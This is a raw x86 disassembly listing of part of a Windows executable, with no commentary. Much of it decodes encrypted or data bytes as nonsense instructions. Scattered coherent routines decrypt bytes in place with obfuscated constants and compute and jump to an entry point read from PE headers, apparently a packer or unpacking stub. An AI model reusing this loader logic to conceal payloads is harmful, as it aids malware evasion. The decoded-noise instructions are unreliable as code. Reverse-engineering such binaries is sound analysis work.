  4061f7:	mov    dl,0x8a
  4061f9:	inc    eax
  4061fa:	adc    BYTE PTR [ebx+0x182d9ae1],ch
  406200:	sar    DWORD PTR [ebp+0xa],cl
  406203:	and    eax,0x23f531d5
  406208:	imul   ecx,ebx,0xffffffdc
  40620b:	test   BYTE PTR [edx-0x5f],0xb5
  40620f:	sti    
  406210:	shl    DWORD PTR [ecx-0x1dd1091f],0xff
  406217:	and    eax,0xdcef485a
  40621c:	cmp    BYTE PTR [edi-0x19],bl
  40621f:	mov    edx,0xc9cda3f7
  406224:	pop    ds
  406225:	and    bl,cl
  406227:	mov    ah,0x4d
  406229:	adc    bh,BYTE PTR [eax-0x64772aee]
  40622f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406230:	mov    ecx,0x3cd3e42d
  406236:	in     eax,dx
  406237:	xor    DWORD PTR [edi+0x207c9bc8],0xffffff9a
  40623e:	mov    ah,0x6d
  406240:	xor    eax,0x7f5379b9
  406245:	popf   
  406246:	call   0x3361:0x33f0716c
  40624d:	jg     0x4062c9
  40624f:	bound  edi,QWORD PTR [ecx-0x1e]
  406252:	in     al,0xcd
  406254:	ret    
  406255:	loope  0x406235
  406257:	pop    eax
  406258:	and    ebx,0xdbf7596f
  40625e:	mov    bh,0xe9
  406260:	dec    ebx
  406261:	aas    
  406262:	add    al,0x79
  406264:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406265:	and    ecx,0xd42f6bba
  40626b:	fdivr  st,st(2)
  40626d:	or     eax,DWORD PTR [eax+0x6104fa6c]
  406273:	cmp    al,0x96
  406275:	pop    ss
  406276:	push   es
  406277:	inc    ecx
  406278:	add    eax,0xc19555a3
  40627d:	fisttp DWORD PTR [edi-0x1b688e9a]
  406283:	sub    DWORD PTR [edx-0x3e72a44],esp
  406289:	sbb    ch,BYTE PTR [edi]
  40628b:	mov    al,ds:0x73da07d9
  406290:	mov    edx,0xf057cddd
  406295:	inc    ebx
  406296:	call   0xe3ab:0x9926eeb4
  40629d:	adc    eax,0x87d97c0c
  4062a2:	push   0x6fd89b68
  4062a7:	dec    esp
  4062a8:	mov    ah,0x36
  4062aa:	sub    esi,edi
  4062ac:	xor    DWORD PTR [edx],eax
  4062ae:	out    dx,eax
  4062af:	cmp    BYTE PTR [ecx],al
  4062b1:	mov    ds:0x72228a3,eax
  4062b6:	aad    0x65
  4062b8:	dec    eax
  4062b9:	dec    ebx
  4062ba:	sub    bl,BYTE PTR [eax-0x3b]
  4062bd:	pop    eax
  4062be:	and    al,0x76
  4062c0:	pop    ds
  4062c1:	pop    ebp
  4062c2:	ret    
  4062c3:	(bad)  
  4062c4:	cmp    BYTE PTR ds:[ecx+esi*8],cl
  4062c8:	sub    BYTE PTR [esi+0x12fe3421],0x3e
  4062cf:	loopne 0x406262
  4062d1:	imul   DWORD PTR [ebx+esi*2+0x58]
  4062d5:	pop    ecx
  4062d6:	mov    ebx,0x6b5d0278
  4062db:	std    
  4062dc:	fisttp DWORD PTR [edx+0x43d8106e]
  4062e2:	bound  esi,QWORD PTR [esi+0x4c]
  4062e5:	mov    edi,0x130504cb
  4062ea:	mov    ecx,DWORD PTR [esi]
  4062ec:	push   ss
  4062ed:	fild   DWORD PTR [esp+esi*8-0x3803cce9]
  4062f4:	rol    al,cl
  4062f6:	inc    ebx
  4062f7:	pop    esp
  4062f8:	outs   dx,DWORD PTR ds:[esi]
  4062f9:	pop    ecx
  4062fa:	mov    ebp,0xc3cd5f5b
  4062ff:	daa    
  406300:	jnp    0x40631d
  406302:	dec    ebp
  406303:	call   0xa484963a
  406308:	push   ebp
  406309:	mov    DWORD PTR [ecx-0x1a],edi
  40630c:	xchg   eax,esi
  40630e:	mov    edi,0x5f1d4e3f
  406313:	(bad)  
  406314:	cmp    ebx,ebp
  406316:	mov    bh,0x46
  406318:	xchg   DWORD PTR ds:0xda57bd02,ebx
  40631e:	sub    DWORD PTR [ebx+0xf80e3b7],esp
  406324:	leave  
  406325:	sbb    al,0xee
  406327:	mov    WORD PTR [edx],gs
  406329:	nop
  40632a:	in     al,0x2b
  40632c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40632d:	into   
  40632e:	outs   dx,BYTE PTR ds:[esi]
  40632f:	fld    TBYTE PTR [ecx+0x5]
  406332:	mov    ds:0x24773a6c,eax
  406337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406338:	clc    
  406339:	mov    al,ds:0xa4ccd2a0
  40633e:	sub    al,0x80
  406340:	cld    
  406341:	pop    esi
  406342:	sbb    BYTE PTR [ebp-0x360ee7f9],0x56
  406349:	push   ds
  40634a:	xor    BYTE PTR [esp+eiz*8-0x26],bl
  40634e:	inc    ebp
  40634f:	mov    ds:0xdec79a54,eax
  406354:	dec    ecx
  406355:	sbb    BYTE PTR [ecx+0x6f04aa47],cl
  40635b:	outs   dx,DWORD PTR ds:[esi]
  40635c:	xlat   BYTE PTR ds:[ebx]
  40635d:	mov    cl,0x11
  40635f:	jecxz  0x4063b6
  406361:	std    
  406362:	scas   eax,DWORD PTR es:[edi]
  406363:	cdq    
  406364:	sbb    al,0xe8
  406366:	jg     0x406303
  406368:	pop    es
  406369:	push   edx
  40636a:	mul    BYTE PTR [ebx+0x195813b1]
  406370:	iret   
  406371:	dec    edi
  406372:	popf   
  406373:	sub    BYTE PTR [ebx-0xf],al
  406376:	push   ss
  406377:	ins    DWORD PTR es:[edi],dx
  406378:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406379:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40637a:	adc    DWORD PTR [ebx+0x1219f6d0],edi
  406380:	mov    ?,WORD PTR [ecx]
  406382:	xchg   esp,eax
  406383:	jmp    0x28bbbc77
  406388:	(bad)  
  406389:	mov    ds:0xa9a025d7,al
  40638e:	xchg   edi,eax
  40638f:	ins    DWORD PTR es:[edi],dx
  406390:	mov    eax,ds:0x2adfd851
  406395:	rol    DWORD PTR [eax-0x69],0x45
  406399:	jmp    0x56106872
  40639e:	out    0x6e,al
  4063a0:	adc    BYTE PTR [ecx-0x31],ch
  4063a3:	stos   BYTE PTR es:[edi],al
  4063a4:	pushf  
  4063a5:	sar    DWORD PTR [eax-0x7fe3cba],cl
  4063ab:	xchg   esi,eax
  4063ac:	repz jg 0x4063e1
  4063af:	icebp  
  4063b0:	sbb    eax,0xfd6f34ba
  4063b5:	aad    0xe2
  4063b7:	mov    esp,DWORD PTR [ebx+0x26]
  4063ba:	into   
  4063bb:	mov    al,0x84
  4063bd:	xor    esp,DWORD PTR ds:0xbfb2f3fe
  4063c3:	mov    dl,ch
  4063c5:	inc    esi
  4063c6:	mov    ds:0x46b78445,al
  4063cb:	enter  0xe914,0xcd
  4063cf:	(bad)  
  4063d1:	pop    ecx
  4063d2:	(bad)  
  4063d3:	jbe    0x4063dc
  4063d9:	mov    edx,DWORD PTR [ebp-0x3c]
  4063dc:	mov    edi,DWORD PTR [ebp-0x4]
  4063df:	xor    edi,eax
  4063e1:	xor    edx,eax
  4063e3:	add    edi,ecx
  4063e5:	add    edx,ecx
  4063e7:	imul   edx,edi
  4063ea:	mov    DWORD PTR [ebp+0xc],edx
  4063ed:	mov    edx,DWORD PTR [ebp+0xc]
  4063f0:	mov    DWORD PTR [ebp-0x24],edx
  4063f3:	mov    edx,DWORD PTR [ebp-0x8]
  4063f6:	add    edx,DWORD PTR [ebp-0x40]
  4063f9:	mov    DWORD PTR [ebp-0x18],0xf89c8531
  406400:	mov    DWORD PTR [ebp-0x1c],edx
  406403:	mov    DWORD PTR [ebp-0xc],0xf89c8532
  40640a:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  406411:	mov    edx,DWORD PTR [ebp-0x18]
  406414:	xor    edx,eax
  406416:	add    edx,ecx
  406418:	jmp    0x4067df
  40641d:	mov    edx,DWORD PTR [ebp-0x18]
  406420:	xor    edx,eax
  406422:	add    edx,DWORD PTR [ebp-0x14]
  406425:	mov    edi,DWORD PTR [ebp-0x1c]
  406428:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  40642f:	mov    BYTE PTR [ebp+0xf],dl
  406432:	mov    edx,DWORD PTR [ebp-0xc]
  406435:	xor    edx,eax
  406437:	add    edx,DWORD PTR [ebp-0x14]
  40643a:	mov    edi,DWORD PTR [ebp-0x1c]
  40643d:	mov    dl,BYTE PTR [edx+edi*1+0x32729b]
  406444:	mov    BYTE PTR [ebp+0xb],dl
  406447:	mov    dl,BYTE PTR [ebp+0xf]
  40644a:	mov    edi,DWORD PTR [ebp-0xc]
  40644d:	jmp    0x4067a7
  406452:	pop    esi
  406453:	xlat   BYTE PTR ds:[ebx]
  406454:	pop    edi
  406455:	jmp    0x4064ce
  406457:	jae    0x4064c3
  406459:	push   ebx
  40645a:	jmp    0x4064aa
  40645c:	cmc    
  40645d:	pop    ss
  40645e:	fucomip st,st(5)
  406460:	scas   al,BYTE PTR es:[edi]
  406461:	push   0x7e7e38a5
  406466:	xor    edi,DWORD PTR [ebp+0x7e]
  406469:	jle    0x406408
  40646b:	sahf   
  40646c:	inc    esi
  40646d:	push   ds
  40646e:	push   ss
  40646f:	xchg   dl,ch
  406471:	fild   QWORD PTR [edi-0x2f]
  406474:	sub    dl,BYTE PTR [edx+0x3cdb6805]
  40647a:	xchg   DWORD PTR [edx+0x5f495f2a],eax
  406480:	repnz push ebp
  406482:	xchg   ecx,eax
  406483:	sbb    ch,al
  406485:	mov    bl,0xb9
  406487:	inc    edx
  406488:	loope  0x406436
  40648a:	xchg   DWORD PTR [eax-0x3ca9fb5f],esp
  406490:	popa   
  406491:	fcomip st,st(5)
  406493:	in     eax,0x24
  406495:	(bad)  [edx-0x4d5ecbf]
  40649b:	or     esi,DWORD PTR [edx]
  40649d:	inc    esi
  40649e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40649f:	xor    eax,0x5131b225
  4064a4:	nop
  4064a5:	jno    0x4064e5
  4064a7:	je     0x406479
  4064a9:	xor    ebp,ebx
  4064ab:	add    al,0xe
  4064ad:	les    ebp,FWORD PTR [esi+0x7b700575]
  4064b3:	test   BYTE PTR [ebx-0x3d85a5d8],0x35
  4064ba:	out    0x22,al
  4064bc:	out    0x95,al
  4064be:	mov    al,ds:0x6189f220
  4064c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064c4:	pop    esp
  4064c5:	inc    esp
  4064c6:	fstp   QWORD PTR [eax-0x36]
  4064c9:	inc    ebx
  4064ca:	xchg   esp,eax
  4064cb:	sbb    DWORD PTR [ecx+0x44],esi
  4064ce:	out    0x9e,al
  4064d0:	nop
  4064d1:	stos   BYTE PTR es:[edi],al
  4064d2:	sub    al,0xb2
  4064d4:	dec    ebx
  4064d5:	mov    ecx,0xdca6b0a4
  4064da:	in     al,0xf4
  4064dc:	fwait
  4064dd:	or     ecx,esp
  4064df:	in     al,0xcf
  4064e1:	jle    0x406501
  4064e3:	and    ah,BYTE PTR [edx]
  4064e5:	sbb    al,0x88
  4064e7:	in     al,0xba
  4064e9:	jl     0x406520
  4064eb:	loope  0x406477
  4064ed:	push   esi
  4064ee:	xor    ebx,DWORD PTR [eax]
  4064f0:	cld    
  4064f1:	pop    es
  4064f2:	xor    cl,al
  4064f4:	sub    BYTE PTR [esi],0xc8
  4064f7:	fidiv  DWORD PTR [esp+edx*1-0x38545e01]
  4064fe:	cmp    eax,0x4d9ed785
  406503:	test   DWORD PTR [ecx],eax
  406505:	(bad)  
  406506:	sbb    eax,0xba70fd9
  40650b:	pop    edx
  40650c:	das    
  40650d:	add    al,0xfc
  40650f:	xchg   ebx,eax
  406510:	test   eax,0xe8855d43
  406515:	sub    edi,DWORD PTR [ebp+0x46]
  406518:	cmp    eax,DWORD PTR [edi+0x42]
  40651b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40651c:	int3   
  40651d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40651e:	jecxz  0x4064fd
  406520:	pop    ecx
  406521:	scas   eax,DWORD PTR es:[edi]
  406522:	dec    ecx
  406523:	mov    ecx,0x63dd7a1f
  406528:	pop    ss
  406529:	xor    eax,DWORD PTR [edx+0x2c]
  40652c:	rol    DWORD PTR cs:[edi+ebx*4+0x744f7945],0x82
  406535:	call   0xb7e5:0x3433f412
  40653c:	sub    edx,DWORD PTR ds:0x404f479
  406542:	and    eax,ebx
  406544:	dec    edx
  406545:	pop    edx
  406546:	jmp    0x240a2558
  40654b:	call   0xcd60e5d4
  406550:	xchg   esp,eax
  406551:	mov    ebx,0x30f8fc99
  406556:	js     0x406566
  406558:	add    esp,DWORD PTR [eax-0x55]
  40655b:	dec    eax
  40655c:	rcr    BYTE PTR [ebx+0x2dd39c4e],cl
  406562:	hlt    
  406563:	push   eax
  406564:	pop    esi
  406565:	fisub  DWORD PTR [edx]
  406567:	in     eax,0x48
  406569:	push   esi
  40656a:	aad    0xd1
  40656c:	jecxz  0x406581
  40656e:	loop   0x4064f3
  406570:	mov    cl,0xbb
  406572:	out    dx,eax
  406573:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406574:	adc    ah,BYTE PTR [ebp-0x4377ceb6]
  40657a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40657b:	mov    edx,edx
  40657d:	ret    0xb87d
  406580:	sbb    BYTE PTR [ebx+0x4d],dh
  406583:	inc    edx
  406584:	xchg   ebp,eax
  406585:	jbe    0x406574
  406587:	cmp    esp,DWORD PTR [ecx-0x2d]
  40658a:	adc    BYTE PTR [ecx+0x42],dl
  40658d:	jnp    0x4065c1
  40658f:	xchg   ecx,eax
  406590:	cwde   
  406591:	fisub  DWORD PTR [ebx+0x51]
  406594:	cld    
  406595:	add    DWORD PTR [esp+ebx*8],esi
  406598:	push   es
  406599:	adc    ebp,ecx
  40659b:	das    
  40659c:	sti    
  40659d:	mov    ah,0x35
  40659f:	out    dx,al
  4065a0:	adc    al,0x10
  4065a2:	inc    edx
  4065a3:	enter  0x842e,0x45
  4065a7:	addr16 sahf 
  4065a9:	out    0x1c,al
  4065ab:	in     eax,dx
  4065ac:	ja     0x406611
  4065ae:	push   0xffffff85
  4065b0:	xor    BYTE PTR [ecx+0x65b3e9cb],0x5d
  4065b7:	sub    BYTE PTR [ebx+0x4c],0xfd
  4065bb:	and    ah,bh
  4065bd:	cmp    eax,0x540f1cd4
  4065c2:	and    DWORD PTR [ecx-0x3830141],ebx
  4065c8:	xor    eax,0x2cb8c389
  4065cd:	div    DWORD PTR [ecx+0x72]
  4065d0:	or     eax,0xb2931501
  4065d5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4065d6:	scas   eax,DWORD PTR es:[edi]
  4065d7:	lods   eax,DWORD PTR ds:[esi]
  4065d8:	or     BYTE PTR [ebx],bl
  4065da:	bound  edi,QWORD PTR [esi-0x59170733]
  4065e0:	enter  0xab9e,0x96
  4065e4:	cs inc ebx
  4065e6:	jns    0x4065e8
  4065e8:	mov    WORD PTR [ebx+0x1f7040ff],cs
  4065ee:	sahf   
  4065ef:	xchg   ebp,eax
  4065f0:	adc    al,BYTE PTR [edi+edx*2]
  4065f3:	xchg   ebp,eax
  4065f4:	mov    esp,0x60ea5bb5
  4065f9:	cmc    
  4065fa:	mov    bh,0x7
  4065fc:	sahf   
  4065fd:	mov    ecx,0x77b4023c
  406602:	cmp    ebx,ebx
  406604:	dec    eax
  406605:	aas    
  406606:	dec    ebp
  406607:	xchg   edi,eax
  406608:	pusha  
  406609:	pop    ds
  40660a:	adc    al,0x24
  40660c:	aas    
  40660d:	out    dx,eax
  40660e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40660f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406610:	ret    
  406611:	out    0xc8,eax
  406613:	(bad)  
  406614:	in     eax,0xbf
  406616:	jecxz  0x406614
  406618:	iret   
  406619:	inc    edi
  40661a:	sub    al,BYTE PTR [eax]
  40661c:	pop    ebp
  40661d:	ss in  eax,dx
  40661f:	arpl   WORD PTR [ecx-0x3d46d7e5],ax
  406625:	xchg   edi,eax
  406626:	xchg   ebx,eax
  406627:	inc    ecx
  406628:	retf   0x4ab0
  40662b:	xchg   edx,eax
  40662c:	fcom   DWORD PTR [edi+0x24]
  40662f:	pop    ss
  406630:	(bad)  
  406631:	out    0x36,eax
  406633:	pop    ss
  406634:	mov    ds,WORD PTR ds:0x6921a015
  40663a:	mov    DWORD PTR [edi+0x72],edi
  40663d:	push   ebx
  40663e:	sub    eax,0x98ba047e
  406643:	mov    ds:0x1784d063,al
  406648:	xchg   ebp,eax
  406649:	and    BYTE PTR [edx+0x1311c5e0],bl
  40664f:	and    ch,BYTE PTR [ebx+ecx*8-0xd]
  406653:	and    eax,0x43bfb34d
  406658:	sbb    WORD PTR [ecx+edi*2-0x4c],0x2a
  40665e:	add    BYTE PTR [eax+0x42],cl
  406661:	shr    bl,1
  406663:	lods   al,BYTE PTR ds:[esi]
  406664:	adc    edx,esp
  406666:	popf   
  406667:	test   al,0x86
  406669:	xchg   edx,eax
  40666a:	push   edi
  40666b:	pop    ecx
  40666c:	or     bh,BYTE PTR [esi+0x18]
  40666f:	in     eax,0x6e
  406671:	push   esi
  406672:	fistp  QWORD PTR [ecx-0x25a9338f]
  406678:	addr16 jmp 0x406662
  40667b:	leave  
  40667c:	and    BYTE PTR [edi-0x73],0x82
  406680:	and    eax,DWORD PTR ds:0xa2ebbd5c
  406686:	int3   
  406687:	nop
  406688:	add    ebp,0xd7b2a59
  40668e:	push   ebp
  40668f:	xchg   edi,eax
  406690:	pop    DWORD PTR [esp+ebx*1+0xe1a8950]
  406697:	sub    DWORD PTR [ebp+eiz*8-0x5d],0x0
  40669c:	ins    DWORD PTR es:[edi],dx
  40669d:	(bad)  
  40669e:	nop
  40669f:	dec    edx
  4066a0:	call   0xe2919d35
  4066a5:	clc    
  4066a6:	fild   WORD PTR [ebp-0x4abb2650]
  4066ac:	stc    
  4066ad:	(bad)  
  4066ae:	shl    BYTE PTR [ebx],1
  4066b0:	daa    
  4066b1:	mov    eax,ds:0x861cc1dc
  4066b6:	sbb    cl,BYTE PTR [esi+0x5d]
  4066b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4066ba:	push   cs
  4066bb:	ss in  eax,dx
  4066bd:	fs je  0x406677
  4066c0:	ficom  DWORD PTR [ebx-0x27d0d598]
  4066c6:	adc    DWORD PTR [edx+0x21d26067],eax
  4066cc:	(bad)  [eax+eiz*4]
  4066cf:	pop    DWORD PTR [esi-0x2f9e7a82]
  4066d5:	imul   edx,DWORD PTR gs:[edi+ebp*1+0x15],0xffffff89
  4066db:	pop    esp
  4066dc:	adc    DWORD PTR [ebx+esi*4+0x7d8918d],ebp
  4066e3:	mov    esi,0xe2531e30
  4066e8:	pushf  
  4066e9:	mov    ah,0x9c
  4066eb:	xor    edx,DWORD PTR [ebx]
  4066ed:	jecxz  0x406684
  4066ef:	fcom   QWORD PTR [esp+edi*1+0x7]
  4066f3:	call   0xe98d:0x622fba89
  4066fa:	rcl    DWORD PTR ss:0x8ac6a6cb,0x35
  406702:	mov    dh,0x13
  406704:	or     esi,ebp
  406706:	and    eax,0x9ee1ac7b
  40670b:	dec    ebp
  40670c:	push   ebx
  40670d:	mov    dl,0xb4
  40670f:	xchg   DWORD PTR [edx-0x5082e829],ebp
  406715:	das    
  406716:	mov    edi,0xd647ed54
  40671b:	stos   BYTE PTR es:[edi],al
  40671c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40671d:	popf   
  40671e:	test   bl,al
  406720:	dec    edi
  406721:	mov    eax,0x5398f88c
  406726:	sub    cl,BYTE PTR [esi]
  406728:	out    0xde,al
  40672a:	fidivr WORD PTR [edi+0x12dcdd4e]
  406730:	pop    esi
  406731:	dec    eax
  406732:	rcr    ebp,cl
  406734:	loop   0x406790
  406736:	mov    ?,WORD PTR [eax]
  406738:	mov    esp,0x833182dc
  40673d:	(bad)  
  40673f:	cli    
  406740:	pop    eax
  406741:	stc    
  406742:	in     eax,dx
  406743:	test   eax,0x307b3594
  406748:	lods   al,BYTE PTR ds:[esi]
  406749:	repz cdq 
  40674b:	(bad)  
  40674c:	(bad)  
  40674d:	jecxz  0x406796
  40674f:	xchg   ebx,eax
  406750:	daa    
  406751:	cmp    BYTE PTR [edi+0x0],bh
  406754:	fsubr  QWORD PTR [edi+0x75]
  406757:	and    BYTE PTR ds:0x94b00106,ah
  40675d:	push   edx
  40675e:	lods   al,BYTE PTR ds:[esi]
  40675f:	xor    edi,DWORD PTR [ebx+0xaeb18ea]
  406765:	and    DWORD PTR [eax+0x1ce0f29a],edx
  40676b:	std    
  40676c:	inc    edx
  40676d:	mov    esp,0x32aab5b5
  406772:	add    al,0xbf
  406774:	push   ebx
  406775:	fimul  DWORD PTR [ebp-0x59cd8324]
  40677b:	sub    esp,DWORD PTR [esi-0x58]
  40677e:	out    dx,eax
  40677f:	cmp    DWORD PTR [edx+0x50ca3054],ecx
  406785:	or     BYTE PTR [ecx],dl
  406787:	sbb    cl,BYTE PTR [eax]
  406789:	aam    0x17
  40678b:	mov    ch,dh
  40678d:	and    BYTE PTR [ecx-0x7358f259],al
  406793:	jmp    0xf8668b5c
  406798:	jae    0x4067a6
  40679a:	fdiv   QWORD PTR [ebp+edx*4-0x58acbf44]
  4067a1:	mov    eax,0xa38e7923
  4067a6:	and    DWORD PTR [ebx],esi
  4067a8:	clc    
  4067a9:	add    edi,DWORD PTR [ebp-0x14]
  4067ac:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067af:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067b6:	mov    dl,BYTE PTR [ebp+0xb]
  4067b9:	mov    edi,DWORD PTR [ebp-0x18]
  4067bc:	xor    edi,eax
  4067be:	add    edi,DWORD PTR [ebp-0x14]
  4067c1:	mov    ebx,DWORD PTR [ebp-0x1c]
  4067c4:	mov    BYTE PTR [edi+ebx*1+0x32729b],dl
  4067cb:	mov    edx,DWORD PTR [ebp-0x44]
  4067ce:	mov    edi,DWORD PTR [ebp-0xc]
  4067d1:	xor    edx,eax
  4067d3:	xor    edi,eax
  4067d5:	add    edx,ecx
  4067d7:	add    edi,ecx
  4067d9:	imul   edx,edi
  4067dc:	add    edx,DWORD PTR [ebp-0x14]
  4067df:	mov    DWORD PTR [ebp-0x14],edx
  4067e2:	mov    edx,DWORD PTR [ebp-0xc]
  4067e5:	mov    edi,DWORD PTR [ebp-0x24]
  4067e8:	xor    edx,eax
  4067ea:	add    edx,ecx
  4067ec:	imul   edx,edi
  4067ef:	mov    edi,DWORD PTR [ebp-0xc]
  4067f2:	xor    edi,eax
  4067f4:	sub    edx,edi
  4067f6:	mov    edi,DWORD PTR [ebp-0xc]
  4067f9:	mov    ebx,DWORD PTR [ebp-0x14]
  4067fc:	xor    edi,eax
  4067fe:	add    edi,ecx
  406800:	imul   edi,ebx
  406803:	mov    ebx,DWORD PTR [ebp-0x18]
  406806:	xor    ebx,eax
  406808:	sub    edx,ecx
  40680a:	lea    edi,[edi+ebx*1+0x32729b]
  406811:	cmp    edi,edx
  406813:	jbe    0x40641d
  406819:	mov    edx,DWORD PTR [ebp-0xc]
  40681c:	mov    edi,DWORD PTR [ebp-0x24]
  40681f:	xor    edx,eax
  406821:	add    edx,ecx
  406823:	imul   edx,edi
  406826:	mov    edi,DWORD PTR [ebp-0x18]
  406829:	xor    edi,eax
  40682b:	add    edx,edi
  40682d:	mov    edi,DWORD PTR [ebp-0x8]
  406830:	lea    edx,[edx+edi*1+0x32729b]
  406837:	mov    DWORD PTR [ebp-0x8],edx
  40683a:	mov    edx,DWORD PTR [ebp-0x20]
  40683d:	xor    edx,eax
  40683f:	mov    edi,0xffcd8d65
  406844:	sub    edi,edx
  406846:	add    edi,DWORD PTR [ebp-0x10]
  406849:	mov    edx,DWORD PTR [ebp-0x20]
  40684c:	mov    ebx,DWORD PTR [ebp-0x8]
  40684f:	xor    edx,eax
  406851:	add    edx,ecx
  406853:	imul   edx,ebx
  406856:	cmp    edx,edi
  406858:	jbe    0x40501f
  40685e:	pop    ebx
  40685f:	pop    edi
  406860:	leave  
  406861:	ret    0x8
  406864:	push   ebp
  406865:	mov    ebp,esp
  406867:	push   ecx
  406868:	mov    ecx,DWORD PTR ds:0x433847
  40686e:	mov    eax,ds:0x43385f
  406873:	sub    ecx,eax
  406875:	xor    ecx,DWORD PTR [ecx+eax*1]
  406878:	mov    ecx,DWORD PTR [ebp+0x8]
  40687b:	and    DWORD PTR ds:0x43376b,0x0
  406885:	jmp    0x406895
  40688a:	mov    eax,ds:0x43376b
  40688f:	inc    eax
  406890:	mov    ds:0x43376b,eax
  406895:	cmp    DWORD PTR ds:0x43376b,0x1d
  40689c:	jae    0x4068e6
  4068a2:	cmp    DWORD PTR ds:0x43376b,0xb
  4068a9:	jne    0x4068c9
  4068af:	push   0x8428
  4068b4:	push   0x433910
  4068b9:	push   0x433910
  4068be:	push   0x433867
  4068c3:	call   DWORD PTR ds:0x412378
  4068c9:	cmp    DWORD PTR ds:0x43376b,0xa
  4068d0:	jne    0x4068e1
  4068d6:	mov    eax,ds:0x43376b
  4068db:	inc    eax
  4068dc:	mov    ds:0x43376b,eax
  4068e1:	jmp    0x40688a
  4068e6:	mov    eax,0x7510854
  4068eb:	sbb    DWORD PTR ds:0x4337fb,0x433773
  4068f5:	xor    ecx,eax
  4068f7:	and    DWORD PTR ds:0x43382f,0x491f
  406901:	add    ecx,0x32729b
  406907:	mov    DWORD PTR ds:0x43371f,0x6297
  406911:	mov    DWORD PTR [ebp+0x10],ecx
  406914:	mov    DWORD PTR [ebp+0x8],0xf34cebd
  40691b:	mov    ecx,0x4881
  406920:	mov    DWORD PTR [ebp-0x4],0xf89c853e
  406927:	mov    ecx,0xf89c8532
  40692c:	push   esi
  40692d:	mov    DWORD PTR ds:0x4337b3,0x711c
  406937:	mov    DWORD PTR [ebp+0x10],0x70019f3
  40693e:	mov    DWORD PTR ds:0x433733,edi
  406944:	mov    esi,DWORD PTR [ebp-0x4]
  406947:	mov    DWORD PTR ds:0x4337b7,0x237d
  406951:	cmp    ecx,esi
  406953:	mov    DWORD PTR ds:0x4337f7,0x9b
  40695d:	je     0x406998
  406963:	and    DWORD PTR ds:0x433717,0x274d
  40696d:	mov    esi,DWORD PTR [ebp+0xc]
  406970:	xor    ecx,eax
  406972:	sub    DWORD PTR ds:0x4337c3,0x433713
  40697c:	xor    esi,eax
  40697e:	lea    ecx,[esi+ecx*1+0x32729b]
  406985:	xor    ecx,eax
  406987:	cmp    ecx,0xf89c8521
  40698d:	jne    0x40692d
  406993:	jmp    0x4069c6
  406998:	add    ecx,0xffcd8d65
  40699e:	mov    esi,ecx
  4069a0:	xor    esi,eax
  4069a2:	add    esi,DWORD PTR [ebp+0x8]
  4069a5:	mov    DWORD PTR [ebp+0x8],esi
  4069a8:	mov    esi,DWORD PTR [ebp+0x8]
  4069ab:	xor    esi,ecx
  4069ad:	xor    esi,eax
  4069af:	mov    eax,DWORD PTR [edx+0x194]
  4069b5:	mov    ecx,DWORD PTR [eax]
  4069b7:	mov    eax,DWORD PTR [ecx+0x3c]
  4069ba:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  4069be:	add    eax,ecx
  4069c0:	mov    DWORD PTR [ebp+0x8],esi
  4069c3:	mov    DWORD PTR [ebp+0x10],eax
  4069c6:	mov    eax,DWORD PTR [ebp+0x10]
  4069c9:	pop    esi
  4069ca:	test   eax,eax
  4069cc:	jmp    0x406c4a
  4069d1:	gs aaa 
  4069d3:	jns    0x406a20
  4069d5:	dec    ecx
  4069d6:	jno    0x406a4d
  4069d8:	xor    DWORD PTR [ebp-0x119b6e39],ecx
  4069de:	cmp    esp,DWORD PTR [eax+0x2a]
  4069e1:	data16 (bad) 
  4069e3:	jle    0x406a63
  4069e5:	fistp  QWORD PTR [esi+edi*2+0x7e]
  4069e9:	xchg   esi,eax
  4069ea:	iret   
  4069eb:	add    BYTE PTR [ebp+0x2a],ch
  4069ee:	fsub   st(0),st
  4069f0:	cmp    al,0x1e
  4069f2:	sub    bl,0x2
  4069f5:	or     eax,0x8f99a6ed
  4069fa:	fdivr  QWORD PTR [esi-0x73]
  4069fd:	jge    0x4069eb
  4069ff:	or     ah,BYTE PTR [edi+esi*4]
  406a02:	aaa    
  406a03:	js     0x406a1b
  406a05:	and    dh,ch
  406a07:	xchg   ecx,eax
  406a08:	fidivr WORD PTR [ebx]
  406a0a:	nop
  406a0b:	mov    ch,0x9b
  406a0d:	lds    ebx,FWORD PTR [edi-0xdc6d810]
  406a13:	mov    dl,0x9
  406a15:	inc    ebp
  406a16:	push   0xe8e85386
  406a1b:	fisttp QWORD PTR [ecx]
  406a1d:	xor    DWORD PTR [edx+0xc4c8c08],esi
  406a23:	mov    ecx,0x823591d7
  406a28:	pop    ebx
  406a29:	inc    ebp
  406a2a:	mov    ch,BYTE PTR [ecx-0x3ef2a6a6]
  406a30:	xor    eax,0xc8cf046
  406a35:	sar    DWORD PTR [edi-0x102f15fd],cl
  406a3b:	dec    edi
  406a3c:	push   ss
  406a3d:	xchg   ecx,eax
  406a3e:	stc    
  406a3f:	loope  0x406a78
  406a41:	in     eax,dx
  406a42:	les    esi,FWORD PTR [ebx]
  406a44:	(bad)  
  406a45:	aad    0xa5
  406a47:	jne    0x4069d5
  406a49:	pop    ds
  406a4a:	add    esi,DWORD PTR [edx+0x58]
  406a4d:	(bad)  
  406a4e:	out    0x35,al
  406a50:	pop    es
  406a51:	push   ebp
  406a52:	pop    esi
  406a53:	add    eax,0xd998fd5f
  406a58:	pusha  
